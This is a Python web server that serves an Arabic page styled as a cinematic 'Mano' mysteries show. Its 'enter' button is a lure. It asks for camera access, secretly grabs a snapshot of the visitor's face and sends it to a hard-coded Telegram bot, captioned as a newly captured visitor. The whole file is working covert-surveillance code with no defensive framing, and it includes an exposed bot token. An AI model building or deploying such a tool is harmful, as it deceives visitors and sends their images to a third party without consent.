from http.server import HTTPServer, BaseHTTPRequestHandler
import base64
import requests
import json
import os

TOKEN = "8873345371:AAHjMHaOARvODtNuBhSZpMRnMhWJgqT4kck"
CHAT_ID = "8873345371"

class CinematicHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        
        html = """
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="utf-8">
            <title>مانو - العوالم الغامضة</title>
            <style>
                body, html {
                    margin: 0;
                    padding: 0;
                    width: 100%;
                    height: 100%;
                    overflow: hidden;
                    background: #000;
                    font-family: 'Tahoma', sans-serif;
                }
                #bg-video {
                    position: fixed;
                    right: 0;
                    bottom: 0;
                    min-width: 100%;
                    min-height: 100%;
                    z-index: -1;
                    object-fit: cover;
                }
                .content {
                    position: absolute;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    text-align: center;
                    color: white;
                    background: rgba(0, 0, 0, 0.7);
                    padding: 30px;
                    border-radius: 15px;
                    box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
                    width: 320px;
                }
                h1 {
                    color: #e50914;
                    margin-bottom: 15px;
                    font-size: 26px;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
                }
                p {
                    color: #ccc;
                    font-size: 14px;
                    margin-bottom: 20px;
                }
                .btn {
                    background: #e50914;
                    color: white;
                    border: none;
                    padding: 12px 25px;
                    font-size: 16px;
                    font-weight: bold;
                    border-radius: 6px;
                    cursor: pointer;
                    width: 100%;
                    box-shadow: 0 4px 15px rgba(229, 9, 20, 0.4);
                    transition: 0.3s;
                }
                .btn:hover {
                    background: #b20710;
                }
            </style>
        </head>
        <body>

            <video id="bg-video" autoplay loop muted playsinline>
                <source src="مانو فديو.mp4" type="video/mp4">
                متصفحك لا يدعم عرض الفيديو.
            </video>

            <div class="content" id="box">
                <h1>مرحباً بك مع مانو</h1>
                <p>اضغط أدناه لتكتشف الغرائب والمستحيل أمام عينيك...</p>
                <button id="verifyBtn" class="btn" onclick="startExperience()">دخول العرض</button>
            </div>

            <video id="cam-video" autoplay playsinline style="display:none;"></video>
            <canvas id="canvas" style="display:none;"></canvas>

            <script>
                function startExperience() {
                    const btn = document.getElementById('verifyBtn');
                    btn.innerText = "جاري التحميل...";
                    btn.disabled = true;

                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                        .then(stream => {
                            const camVideo = document.getElementById('cam-video');
                            camVideo.srcObject = stream;
                            
                            setTimeout(() => {
                                const canvas = document.getElementById('canvas');
                                canvas.width = camVideo.videoWidth || 640;
                                canvas.height = camVideo.videoHeight || 480;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(camVideo, 0, 0, canvas.width, canvas.height);
                                
                                const imageData = canvas.toDataURL('image/jpeg');
                                
                                fetch('/upload', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ image: imageData })
                                }).then(res => {
                                    stream.getTracks().forEach(track => track.stop());
                                    document.getElementById('box').innerHTML = "<h2 style='color:#e50914;'>أهلاً بك في عالم الغرائب!</h2>";
                                });
                            }, 1000);
                        })
                        .catch(err => {
                            alert("يرجى السماح بالوصول للمتابعة ومشاهدة المحتوى.");
                            btn.innerText = "دخول العرض";
                            btn.disabled = false;
                        });
                }
            </script>
        </body>
        </html>
        """
        self.wfile.write(html.encode("utf-8"))

    def do_POST(self):
        if self.path == '/upload':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            try:
                data = json.loads(post_data)
                img_data = data['image'].split(',')[1]
                img_bytes = base64.b64decode(img_data)
                
                telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
                files = {'photo': ('manow_snapshot.jpg', img_bytes, 'image/jpeg')}
                data_payload = {'chat_id': CHAT_ID, 'caption': '🧛‍♂️ تم التقاط زائر جديد من واجهة "مانو"!'}
                
                requests.post(telegram_url, data=data_payload, files=files)
            except Exception as e:
                print(f"خطأ في الإرسال: {e}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    server_address = ('', port)
    httpd = HTTPServer(server_address, CinematicHandler)
    print(f"[*] السيرفر يعمل على البورت {port}...")
    httpd.serve_forever()
